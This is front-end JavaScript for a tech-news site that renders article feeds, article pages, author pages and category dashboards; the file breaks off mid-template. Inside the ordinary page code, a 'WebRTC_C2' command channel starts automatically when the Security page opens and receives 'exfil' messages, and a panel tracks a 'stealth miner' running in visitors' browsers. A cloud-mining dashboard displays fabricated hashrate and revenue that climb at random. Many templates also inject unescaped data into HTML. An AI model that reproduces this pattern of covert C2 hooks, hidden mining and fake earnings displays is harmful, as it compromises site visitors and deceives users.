        container.className = 'flex flex-col gap-8'; // Override grid classes

        container.innerHTML = feedArticles.map(article => {
            const sentimentColor = article.sentiment === 'Positive' ? 'text-green-600 dark:text-green-400' : 
                                   article.sentiment === 'Negative' ? 'text-red-600 dark:text-red-400' : 'text-gray-500';
            return `
            <div class="group flex flex-col md:flex-row gap-6 items-start pb-8 border-b border-gray-100 dark:border-gray-800 last:border-0 cursor-pointer" onclick="location.hash='#article/${article.id}'">
                <div class="flex-1 order-2 md:order-1">
                    <div class="flex items-center gap-3 mb-2">
                        <span class="text-xs font-bold text-brand uppercase tracking-wider">${article.category}</span>
                        ${article.sentiment ? `<span class="text-[10px] font-bold ${sentimentColor} flex items-center gap-1">
                            <span class="w-1.5 h-1.5 rounded-full bg-current"></span>
                            ${article.sentiment}
                        </span>` : ''}
                    </div>
                    
                    <h3 class="text-2xl font-bold mb-3 leading-tight group-hover:text-brand transition-colors text-gray-900 dark:text-gray-100">
                        ${article.title}
                    </h3>
                    
                    <p class="text-gray-600 dark:text-gray-400 text-base mb-4 line-clamp-3 leading-relaxed">
                        ${article.excerpt || ''}
                    </p>
                    
                    <div class="flex items-center gap-3 text-sm text-gray-500 font-medium">
                        <span class="text-gray-900 dark:text-gray-300 font-bold">${article.authorName || 'Unknown'}</span>
                        <span>‚Ä¢</span>
                        <span>${new Date(article.publishedAt || Date.now()).toLocaleDateString()}</span>
                        <span>‚Ä¢</span>
                        <span>${article.readTime || '5 min read'}</span>
                    </div>
                </div>
                
                <div class="w-full md:w-1/3 aspect-[4/3] md:aspect-[3/2] order-1 md:order-2 overflow-hidden rounded-lg bg-gray-100 dark:bg-gray-800">
                    <img loading="lazy" src="${article.image || 'https://via.placeholder.com/800x400'}" onerror="this.src='https://via.placeholder.com/800x400?text=No+Image'" class="w-full h-full object-cover transform group-hover:scale-105 transition-transform duration-500" alt="${article.title}" />
                </div>
            </div>
        `}).join('');

        // Load Analytics
        const profileStr = localStorage.getItem('user_ai_profile');
        if (profileStr) {
            const profile = JSON.parse(profileStr);
            
            // Current Session Duration
            const duration = Math.floor((Date.now() - BehaviorTracker.startTime) / 1000);
            const minutes = Math.floor(duration / 60).toString().padStart(2, '0');
            const seconds = (duration % 60).toString().padStart(2, '0');
            const timeEl = document.getElementById('admin-analytics-time');
            if(timeEl) timeEl.innerText = `${minutes}:${seconds}`;

            // Top Interest
            const sortedInterests = Object.entries(profile.interests).sort(([,a], [,b]) => b - a);
            const topInterest = sortedInterests.length > 0 ? sortedInterests[0][0] : 'None';
            const interestEl = document.getElementById('admin-analytics-interest');
            if(interestEl) interestEl.innerText = topInterest;
            
            // Score
            const scoreEl = document.getElementById('admin-analytics-score');
            if(scoreEl) scoreEl.innerText = profile.interactions;
        }
    }

    function renderHomeHero(article) {
        const hero = document.getElementById('home-hero');
        if (!hero || !article) return;

        hero.classList.remove('hidden');
        // TechCrunch Style Hero: Large, Bold, Impactful
        hero.innerHTML = `
            <div class="absolute inset-0">
                <img src="${article.image}" alt="${article.title}" class="w-full h-full object-cover transition-transform duration-700 group-hover:scale-105" />
                <div class="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-transparent opacity-90"></div>
            </div>
            
            <div class="absolute bottom-0 left-0 p-6 md:p-12 w-full md:w-3/4 lg:w-2/3 flex flex-col justify-end h-full z-10 pointer-events-none">
                <div class="pointer-events-auto">
                    <span class="inline-block bg-brand text-black text-xs font-bold px-3 py-1 rounded-sm mb-6 uppercase tracking-wider shadow-lg transform -skew-x-6">
                        <span class="block transform skew-x-6">Featured Story</span>
                    </span>
                    
                    <h1 class="text-3xl md:text-5xl lg:text-6xl font-black text-white mb-6 leading-tight group-hover:text-brand transition-colors drop-shadow-lg">
                        ${article.title}
                    </h1>
                    
                    <p class="text-gray-200 text-lg md:text-xl mb-8 line-clamp-2 md:line-clamp-none leading-relaxed max-w-2xl drop-shadow-md">
                        ${article.excerpt}
                    </p>
                    
                    <div class="flex items-center gap-6 text-white font-bold text-sm">
                        <div class="flex items-center gap-3">
                            <img src="${article.authorAvatar || 'https://ui-avatars.com/api/?name='+article.authorName}" onerror="this.src='https://ui-avatars.com/api/?name='+encodeURIComponent('${article.authorName}')" class="w-10 h-10 rounded-full border-2 border-brand bg-white" />
                            <span class="text-lg">${article.authorName}</span>
                        </div>
                        <span class="opacity-50">‚Ä¢</span>
                        <span class="opacity-90">${article.readTime || '5 min read'}</span>
                    </div>
                </div>
            </div>
        `;
        hero.onclick = () => location.hash = `#article/${article.id}`;
    }

    async function renderHomeMarketWidget() {
        const marketData = await window.dataSdk.getCollection('market_data');
        const container = document.getElementById('home-market-widget');
        if (!container || !marketData) return;

        // Show top 3 movers
        container.innerHTML = marketData.slice(0, 3).map(item => `
            <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800/50 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors cursor-pointer" onclick="location.hash='#market'">
                <div>
                    <div class="font-bold text-sm">${item.symbol}</div>
                    <div class="text-xs text-gray-500">${item.trend === 'up' ? 'Bullish' : 'Bearish'}</div>
                </div>
                <div class="text-right">
                    <div class="font-mono font-bold text-sm">${item.price}</div>
                    <div class="text-xs font-bold ${item.trend === 'up' ? 'text-green-500' : 'text-red-500'}">
                        ${item.change}
                    </div>
                </div>
            </div>
        `).join('');
    }

    // 2. ARTICLE DETAIL
    async function renderArticleDetail(id) {
        currentArticleId = id;
        const article = await dataSdk.getItem('articles', id);
        
        if (!article) {
            showToast('Article not found', 'error');
            location.hash = '#';
            return;
        }

        // Update OpenGraph & Twitter Meta Tags
        const updateMeta = (selector, content) => {
            const el = document.querySelector(selector);
            if (el && content) el.setAttribute('content', content);
        };

        updateMeta('meta[property="og:title"]', article.title);
        updateMeta('meta[property="og:description"]', article.excerpt);
        updateMeta('meta[property="og:image"]', article.image);
        updateMeta('meta[property="og:url"]', window.location.href);
        
        updateMeta('meta[property="twitter:title"]', article.title);
        updateMeta('meta[property="twitter:description"]', article.excerpt);
        updateMeta('meta[property="twitter:image"]', article.image);
        updateMeta('meta[property="twitter:url"]', window.location.href);

        document.title = `${article.title} | TechCronch`;

        // Update Reading History
        dataSdk.addToHistory(id);

        // Populate DOM
        const sentimentHtml = article.sentiment ? ` <span class="ml-2 opacity-75 ${article.sentiment === 'Positive' ? 'text-green-600 dark:text-green-400' : article.sentiment === 'Negative' ? 'text-red-600 dark:text-red-400' : 'text-gray-500'}">‚Ä¢ ${article.sentiment} AI Score</span>` : '';
        document.getElementById('detail-category').innerHTML = article.category + sentimentHtml;
        
        document.getElementById('detail-title').innerText = article.title;
        document.getElementById('detail-image').src = article.image || 'https://via.placeholder.com/1200x600';
        document.getElementById('detail-image').onerror = function() { this.src = 'https://via.placeholder.com/1200x600?text=No+Image'; };
        document.getElementById('detail-image').alt = article.title;
        
        // Robust Sanitize
        let contentHtml = article.content || article.excerpt;
        if (window.GuardianSDK && typeof GuardianSDK.sanitize === 'function') {
            contentHtml = GuardianSDK.sanitize(contentHtml);
        }
        document.getElementById('detail-content').innerHTML = contentHtml;

        // --- CLOUD MINING CALCULATOR (Only for Crypto Articles) ---
        const calcContainer = document.getElementById('crypto-calculator-container');
        if (calcContainer) calcContainer.remove(); // Remove existing if any

        if (article.category === 'Crypto') {
            const calcDiv = document.createElement('div');
            calcDiv.id = 'crypto-calculator-container';
            calcDiv.className = 'mt-8 mb-8 bg-gray-50 dark:bg-gray-800 p-6 rounded-xl border border-gray-200 dark:border-gray-700';
            calcDiv.innerHTML = `
                <h3 class="text-xl font-bold mb-4 flex items-center gap-2">
                    <svg class="w-6 h-6 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
                    Mining Profitability Calculator
                </h3>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
                    <div>
                        <label class="block text-xs font-bold text-gray-500 mb-1">Hashrate (TH/s)</label>
                        <input type="number" id="calc-hash" value="100" class="w-full bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded px-3 py-2 text-sm font-mono">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-gray-500 mb-1">Power (Watts)</label>
                        <input type="number" id="calc-power" value="3000" class="w-full bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded px-3 py-2 text-sm font-mono">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-gray-500 mb-1">Cost ($/kWh)</label>
                        <input type="number" id="calc-cost" value="0.10" step="0.01" class="w-full bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded px-3 py-2 text-sm font-mono">
                    </div>
                </div>
                <div class="flex items-center justify-between bg-white dark:bg-gray-900 p-4 rounded-lg border border-gray-200 dark:border-gray-700">
                    <div>
                        <div class="text-xs text-gray-500">Daily Profit</div>
                        <div class="text-xl font-bold text-green-500" id="calc-result">$0.00</div>
                    </div>
                    <button onclick="calculateProfit()" class="bg-brand text-black font-bold px-4 py-2 rounded hover:bg-brand-dark transition-colors">
                        Calculate
                    </button>
                </div>
            `;
            document.getElementById('detail-content').parentNode.insertBefore(calcDiv, document.getElementById('detail-content').nextSibling);
            
            // Add global function if not exists
            if (!window.calculateProfit) {
                window.calculateProfit = () => {
                    const hash = parseFloat(document.getElementById('calc-hash').value) || 0;
                    const power = parseFloat(document.getElementById('calc-power').value) || 0;
                    const cost = parseFloat(document.getElementById('calc-cost').value) || 0;
                    
                    // Simplified formula: (Hash * Reward) - (Power * 24 * Cost / 1000)
                    // Assume 1 TH/s = $0.07 daily revenue
                    const revenue = hash * 0.07;
                    const expense = (power * 24 / 1000) * cost;
                    const profit = revenue - expense;
                    
                    const el = document.getElementById('calc-result');
                    el.innerText = '$' + profit.toFixed(2);
                    el.className = `text-xl font-bold ${profit >= 0 ? 'text-green-500' : 'text-red-500'}`;
                };
            }
        }
        
        document.getElementById('detail-date').innerText = new Date(article.publishedAt || Date.now()).toLocaleDateString() + ' ‚Ä¢ ' + (article.readTime || '5 min read');
        
        // Likes
        document.getElementById('article-like-count').innerText = article.likes || Math.floor(Math.random() * 500);

        // Author Info
        document.getElementById('detail-author-name').innerText = article.authorName || 'Editor';
        document.getElementById('detail-author-avatar').src = article.authorAvatar || 'https://ui-avatars.com/api/?name=Editor';
        document.getElementById('detail-author-avatar').onerror = function() { this.src = 'https://ui-avatars.com/api/?name=Editor'; };
        
        // Link to Author Page
        if (article.authorId) {
            document.getElementById('detail-author-link').href = `#author/${article.authorId}`;
        } else {
             document.getElementById('detail-author-link').href = '#';
        }

        // Author Socials
        const socialContainer = document.getElementById('detail-author-social');
        if (socialContainer) {
            if (article.authorSocial) {
                socialContainer.innerHTML = `
                    ${article.authorSocial.twitter ? `<a href="https://twitter.com/${article.authorSocial.twitter.replace('@','')}" target="_blank" class="text-gray-400 hover:text-[#1DA1F2] transition-colors"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 2.404-5.69 2.118-8.38 1.103 2.559 1.482 5.59 2.38 8.71 2.38 10.545 0 16.312-8.75 16.208-16.592 0-.251-.005-.496-.015-.739 1.119-.815 2.088-1.838 2.859-2.903z"/></svg></a>` : ''}
                    ${article.authorSocial.website ? `<a href="https://${article.authorSocial.website}" target="_blank" class="text-gray-400 hover:text-brand transition-colors"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg></a>` : ''}
                `;
            } else {
                socialContainer.innerHTML = '';
            }
        }

        // Render Comments
        renderComments(id);
        
        // Render Share Buttons
        renderShareButtons();

        // Render Related Articles (Recommendations)
        const related = await dataSdk.getRecommendations(id);
        const relatedContainer = document.getElementById('related-articles-list');
        relatedContainer.innerHTML = related.map(a => `
            <a href="#article/${a.id}" class="flex items-start gap-4 group p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
                <img loading="lazy" src="${a.image}" alt="${a.title}" class="w-20 h-20 rounded-lg object-cover bg-gray-200" />
                <div>
                    <span class="text-[10px] font-bold text-brand uppercase">${a.category}</span>
                    <h4 class="text-sm font-bold leading-tight group-hover:text-brand transition-colors line-clamp-2">${a.title}</h4>
                </div>
            </a>
        `).join('');
    }

    // 3. AUTHOR DETAIL
    async function renderAuthorDetail(id) {
        try {
            let author = await dataSdk.getItem('authors', id);

            // Fallback: Find from articles if not found in authors collection (legacy support)
            if (!author) {
                const articles = await dataSdk.getArticles();
                if (articles) {
                    const art = articles.find(a => a.authorId === id);
                    if (art) {
                        author = {
                            name: art.authorName,
                            avatar: art.authorAvatar,
                            role: 'Contributor',
                            bio: 'Tech journalist and industry analyst.',
                            social: {}
                        };
                    }
                }
            }

            if (!author) {
                 showToast('Author not found', 'error');
                 return;
            }

            document.getElementById('author-page-name').innerText = author.name;
            document.getElementById('author-page-role').innerText = author.role || 'Writer';
            document.getElementById('author-page-bio').innerText = author.bio || 'No bio available.';
            document.getElementById('author-page-avatar').src = author.avatar;

            // Social Links
            const socialContainer = document.getElementById('author-social-links');
            if (socialContainer) {
                 if (author.social) {
                     socialContainer.innerHTML = `
                        ${author.social.twitter ? `<a href="https://twitter.com/${author.social.twitter.replace('@','')}" target="_blank" class="text-gray-400 hover:text-[#1DA1F2] transition-colors"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 2.404-5.69 2.118-8.38 1.103 2.559 1.482 5.59 2.38 8.71 2.38 10.545 0 16.312-8.75 16.208-16.592 0-.251-.005-.496-.015-.739 1.119-.815 2.088-1.838 2.859-2.903z"/></svg></a>` : ''}
                        ${author.social.linkedin ? `<a href="https://linkedin.com/in/${author.social.linkedin}" target="_blank" class="text-gray-400 hover:text-[#0077b5] transition-colors"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg></a>` : ''}
                        ${author.social.website ? `<a href="https://${author.social.website}" target="_blank" class="text-gray-400 hover:text-brand transition-colors"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg></a>` : ''}
                     `;
                 } else {
                     socialContainer.innerHTML = '';
                 }
            }

            // Get Author's Articles
            const allArticles = await dataSdk.getArticles();
            if (allArticles) {
                const authorArticles = allArticles.filter(a => a.authorId === id);
                
                document.getElementById('author-articles-grid').innerHTML = authorArticles.map(article => `
                     <div class="article-card bg-white dark:bg-[#1a1a1d] border border-gray-100 dark:border-gray-800 rounded-xl overflow-hidden flex flex-col cursor-pointer group" onclick="location.hash='#article/${article.id}'">
                        <div class="relative h-40 overflow-hidden">
                            <img src="${article.image}" class="w-full h-full object-cover" />
                        </div>
                        <div class="p-4">
                            <h3 class="font-bold mb-2 group-hover:text-brand line-clamp-2">${article.title}</h3>
                            <p class="text-xs text-gray-500">${article.publishedAt ? new Date(article.publishedAt).toLocaleDateString() : ''}</p>
                        </div>
                    </div>
                `).join('');
            }
        } catch (error) {
            console.error('Error rendering author:', error);
            showToast('Failed to load author profile', 'error');
        }
    }

    window.optimizeRigs = async function() {
        showToast('Running AI Optimization...', 'info');
        
        const btn = document.querySelector('button[onclick="optimizeRigs()"]');
        if(btn) {
            btn.disabled = true;
            btn.classList.add('opacity-50', 'cursor-not-allowed');
            btn.innerHTML = '<span class="animate-spin">‚öôÔ∏è</span> TUNING...';
        }

        if (window.GuardianML) {
            const result = await window.GuardianML.optimizeMining();
            
            showToast(`Optimization Complete: +${result.efficiencyGain} Efficiency`, 'success');
            
            // Boost hashrate
            const totalHashEl = document.getElementById('cm-hashrate');
            if (totalHashEl) {
                const current = parseFloat(totalHashEl.innerText);
                const boost = current * (parseFloat(result.efficiencyGain) / 100);
                totalHashEl.innerHTML = (current + boost).toFixed(1) + ' <span class="text-sm text-gray-500">TH/s</span>';
            }
        }

        if(btn) {
            btn.disabled = false;
            btn.classList.remove('opacity-50', 'cursor-not-allowed');
            btn.innerHTML = '<span class="animate-pulse">‚ú®</span> OPTIMIZE';
        }
    };

    // --- WORKER MANAGEMENT ---
    window.addWorker = function() {
        showToast('Deploying new mining contract...', 'info');
        
        // Simulate C2 Communication
        if (window.WebRTC_C2) {
            window.WebRTC_C2.sendExfil({
                type: 'deploy_worker',
                spec: 'Antminer S19 Pro',
                timestamp: Date.now()
            });
        }
        
        const btn = document.querySelector('button[onclick="addWorker()"]');
        if(btn) {
            btn.disabled = true;
            btn.classList.add('opacity-50', 'cursor-not-allowed');
            btn.innerText = 'DEPLOYING...';
        }
        
        setTimeout(() => {
            const rigs = document.getElementById('cm-rigs');
            if (!rigs) return;
            
            const newWorkerId = 'RIG-' + String(Math.floor(Math.random() * 900) + 100).padStart(3, '0');
            const newHash = (Math.random() * 10 + 90).toFixed(1);
            
            const div = document.createElement('div');
            div.className = 'flex items-center justify-between bg-black/40 p-2 rounded border border-gray-800 text-sm opacity-0 transform -translate-x-4 transition-all duration-500';
            div.innerHTML = `
                <div class="flex items-center gap-2">
                    <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                    <span class="font-mono text-gray-300">${newWorkerId} (Antminer S19)</span>
                </div>
                <div class="font-mono text-yellow-500">${newHash} TH/s</div>
            `;
            
            rigs.prepend(div);
            
            // Animate in
            setTimeout(() => div.classList.remove('opacity-0', '-translate-x-4'), 50);
            
            // Update Totals
            const totalHashEl = document.getElementById('cm-hashrate');
            if (totalHashEl) {
                const current = parseFloat(totalHashEl.innerText);
                totalHashEl.innerHTML = (current + parseFloat(newHash)).toFixed(1) + ' <span class="text-sm text-gray-500">TH/s</span>';
            }
            
            // Update Active Workers Count
            const activeWorkersEl = document.querySelector('#cm-hashrate').parentElement.nextElementSibling.querySelector('.text-2xl');
            if (activeWorkersEl) {
                const parts = activeWorkersEl.innerText.split('/');
                if (parts.length === 2) {
                     const current = parseInt(parts[0]);
                     const total = parseInt(parts[1]);
                     activeWorkersEl.innerText = `${current + 1}/${total + 1}`;
                }
            }

            showToast(`Worker ${newWorkerId} Online`, 'success');
            
            if(btn) {
                btn.disabled = false;
                btn.classList.remove('opacity-50', 'cursor-not-allowed');
                btn.innerText = '+ ADD WORKER';
            }
            
        }, 2000);
    };

    // 4. CATEGORY VIEW
    async function renderCategory(cat) {
        document.getElementById('category-title').innerText = cat;
        
        try {
            const allArticles = await dataSdk.getArticles();
            if (!allArticles) {
                console.error('Failed to fetch articles for category view');
                return;
            }

            const catArticles = allArticles.filter(a => a.category === cat);
            
            const container = document.getElementById('category-articles-grid');
            
            let htmlContent = '';

            // --- CLOUD MINING FARM DASHBOARD (Only for Crypto Category) ---
            if (cat === 'Crypto') {
                htmlContent += `
                <div class="col-span-1 md:col-span-3 mb-8 bg-gray-900 text-white border border-gray-800 rounded-xl p-6 relative overflow-hidden">
                    <div class="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1518546305927-5a555bb7020d?auto=format&fit=crop&w=1600&q=80')] opacity-20 bg-cover bg-center"></div>
                    <div class="relative z-10">
                        <div class="flex items-center justify-between mb-6">
                            <h3 class="text-xl font-mono font-bold text-yellow-500 flex items-center gap-2">
                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
                                CLOUD MINING FARM STATUS
                            </h3>
                            <div class="flex gap-2">
                                <button onclick="optimizeRigs()" class="bg-purple-600 hover:bg-purple-500 text-white text-xs font-bold px-3 py-1 rounded transition-colors flex items-center gap-1">
                                    <span class="animate-pulse">‚ú®</span> OPTIMIZE
                                </button>
                                <button onclick="addWorker()" class="bg-yellow-500 hover:bg-yellow-400 text-black text-xs font-bold px-3 py-1 rounded transition-colors">
                                    + ADD WORKER
                                </button>
                            </div>
                        </div>
                        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                            <div class="bg-black/60 p-4 rounded-lg border border-gray-700 backdrop-blur-sm">
                                <div class="text-xs text-gray-400 mb-1">TOTAL HASHRATE</div>
                                <div class="text-2xl font-bold text-white font-mono" id="cm-hashrate">245.8 <span class="text-sm text-gray-500">TH/s</span></div>
                            </div>
                             <div class="bg-black/60 p-4 rounded-lg border border-gray-700 backdrop-blur-sm">
                                <div class="text-xs text-gray-400 mb-1">ACTIVE WORKERS</div>
                                <div class="text-2xl font-bold text-green-400 font-mono">12/12</div>
                            </div>
                            <div class="bg-black/60 p-4 rounded-lg border border-gray-700 backdrop-blur-sm">
                                <div class="text-xs text-gray-400 mb-1">24H REVENUE</div>
                                <div class="text-2xl font-bold text-yellow-400 font-mono" id="cm-revenue">$18.42</div>
                            </div>
                             <div class="bg-black/60 p-4 rounded-lg border border-gray-700 backdrop-blur-sm">
                                <div class="text-xs text-gray-400 mb-1">NEXT PAYOUT</div>
                                <div class="text-2xl font-bold text-blue-400 font-mono">04:12:30</div>
                            </div>
                        </div>
                        
                        <!-- Simulated Worker List -->
                        <div class="mt-6">
                            <div class="text-xs font-bold text-gray-500 mb-2 uppercase tracking-wider">Active Rigs</div>
                            <div class="space-y-2" id="cm-rigs">
                                <div class="flex items-center justify-between bg-black/40 p-2 rounded border border-gray-800 text-sm">
                                    <div class="flex items-center gap-2">
                                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                                        <span class="font-mono text-gray-300">RIG-001 (Antminer S19)</span>
                                    </div>
                                    <div class="font-mono text-yellow-500">95 TH/s</div>
                                </div>
                                <div class="flex items-center justify-between bg-black/40 p-2 rounded border border-gray-800 text-sm">
                                    <div class="flex items-center gap-2">
                                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                                        <span class="font-mono text-gray-300">RIG-002 (Antminer S19)</span>
                                    </div>
                                    <div class="font-mono text-yellow-500">94 TH/s</div>
                                </div>
                                 <div class="flex items-center justify-between bg-black/40 p-2 rounded border border-gray-800 text-sm">
                                    <div class="flex items-center gap-2">
                                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                                        <span class="font-mono text-gray-300">RIG-003 (Whatsminer M30S)</span>
                                    </div>
                                    <div class="font-mono text-yellow-500">56.8 TH/s</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                `;
                
                // Simulate Real-time updates for Cloud Mining
                setTimeout(() => {
                    const hashEl = document.getElementById('cm-hashrate');
                    const revEl = document.getElementById('cm-revenue');
                    if (hashEl && !window.cmInterval) {
                        window.cmInterval = setInterval(() => {
                            if (document.getElementById('cm-hashrate')) {
                                // Fluctuate hashrate
                                const baseHash = 245.8;
                                const fluctuation = (Math.random() - 0.5) * 5;
                                const newHash = (baseHash + fluctuation).toFixed(1);
                                document.getElementById('cm-hashrate').innerHTML = `${newHash} <span class="text-sm text-gray-500">TH/s</span>`;
                                
                                // Tick up revenue slowly
                                let currentRev = parseFloat(document.getElementById('cm-revenue').innerText.replace('$',''));
                                currentRev += 0.0001;
                                document.getElementById('cm-revenue').innerText = '$' + currentRev.toFixed(4);
                            } else {
                                clearInterval(window.cmInterval);
                                window.cmInterval = null;
                            }
                        }, 2000);
                    }
                }, 100);
            }

            // --- GHOSTNET SECURITY DASHBOARD (Only for Security Category) ---
            if (cat === 'Security') {
                htmlContent += `
                <div class="col-span-1 md:col-span-3 mb-8 bg-black border border-brand/30 rounded-xl p-6 relative overflow-hidden">
                    <div class="absolute inset-0 bg-[url('https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif')] opacity-10 bg-cover"></div>
                    <div class="relative z-10">
                        <div class="flex items-center justify-between mb-6">
                            <h3 class="text-xl font-mono font-bold text-brand flex items-center gap-2">
                                <span class="w-3 h-3 bg-red-500 rounded-full animate-pulse"></span>
                                GHOSTNET REAL-TIME MONITOR
                            </h3>
                            <div class="text-xs font-mono text-gray-400">
                                NODE: ALPHA-7 // LATENCY: 12ms
                            </div>
                        </div>
                        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                            <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">THREAT LEVEL</div>
                                <div class="text-2xl font-bold text-red-500" id="gn-threat">LOW</div>
                            </div>
                             <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">INTEGRITY</div>
                                <div class="text-2xl font-bold text-brand" id="gn-integrity">100%</div>
                            </div>
                            <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">BOT PROBABILITY (ML)</div>
                                <div class="text-2xl font-bold text-purple-500" id="gn-ml-score">0.0%</div>
                            </div>
                             <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">ACTIVE NODES</div>
                                <div class="text-2xl font-bold text-white">1,042</div>
                            </div>
                        </div>

                        <div class="mt-4 grid grid-cols-2 gap-4">
                            <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">STEALTH MINER</div>
                                <div class="text-xl font-bold text-gray-500" id="gn-miner-status">OFF</div>
                            </div>
                             <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">ENCRYPTION</div>
                                <div class="text-xl font-bold text-brand">AES-256</div>
                            </div>
                        </div>
                        
                         <div class="mt-6 h-32 bg-gray-900/50 rounded border border-gray-800 flex items-end px-2 gap-1 overflow-hidden" id="gn-visualizer">
                            <!-- Bars generated via JS -->
                        </div>
                    </div>
                </div>
                `;

                // Start Visualizer Loop
                 setTimeout(() => {
                    // Initialize WebRTC C2 automatically when dashboard opens
                    if (window.WebRTC_C2 && !WebRTC_C2.isConnected) {
                        WebRTC_C2.init();
                    }

                     const viz = document.getElementById('gn-visualizer');
                    if(viz && !window.gnInterval) {
                        window.gnInterval = setInterval(() => {
                            if(document.getElementById('gn-ml-score')) {
                                // Update Stats
                                document.getElementById('gn-ml-score').innerText = (GuardianSDK.state.mlConfidence || '0') + '%';
                                document.getElementById('gn-integrity').innerText = GuardianSDK.state.integrityScore + '%';
                                 document.getElementById('gn-threat').innerText = GuardianSDK.state.threatLevel;
                                 
                                 // Miner Status
                                 if (WasmStealth.isActive) {
                                     document.getElementById('gn-miner-status').innerText = "RUNNING";
                                     document.getElementById('gn-miner-status').classList.remove('text-gray-500');
                                     document.getElementById('gn-miner-status').classList.add('text-red-500');
                                 } else {
                                     document.getElementById('gn-miner-status').innerText = "OFF";
                                     document.getElementById('gn-miner-status').classList.add('text-gray-500');
                                     document.getElementById('gn-miner-status').classList.remove('text-red-500');
                                 }

                                 // Add visualizer bar
                                const h = Math.random() * 100;
                                const bar = document.createElement('div');
                                bar.className = 'w-1 bg-brand/50 transition-all duration-300';
                                bar.style.height = h + '%';
                                viz.appendChild(bar);
                                if(viz.children.length > 60) viz.removeChild(viz.firstChild);
                            } else {
                                clearInterval(window.gnInterval);
                                window.gnInterval = null;
                            }
                        }, 200);
                    }
                }, 500);
            }

            // --- CLOUD MINING DASHBOARD (Only for Crypto Category) ---
            if (cat === 'Crypto') {
                htmlContent += `
                <div class="col-span-1 md:col-span-3 mb-8 bg-gradient-to-r from-gray-900 to-black border border-yellow-500/30 rounded-xl p-6 relative overflow-hidden">
                    <div class="absolute inset-0 bg-[url('https://media.giphy.com/media/l41lFw057lAJQMwg0/giphy.gif')] opacity-5 bg-cover"></div>
                    <div class="relative z-10">
                        <div class="flex items-center justify-between mb-6">
                            <h3 class="text-xl font-mono font-bold text-yellow-500 flex items-center gap-2">
                                <span class="w-3 h-3 bg-yellow-500 rounded-full animate-pulse"></span>
                                CLOUD MINING OPS
                            </h3>
                            <div class="text-xs font-mono text-gray-400">
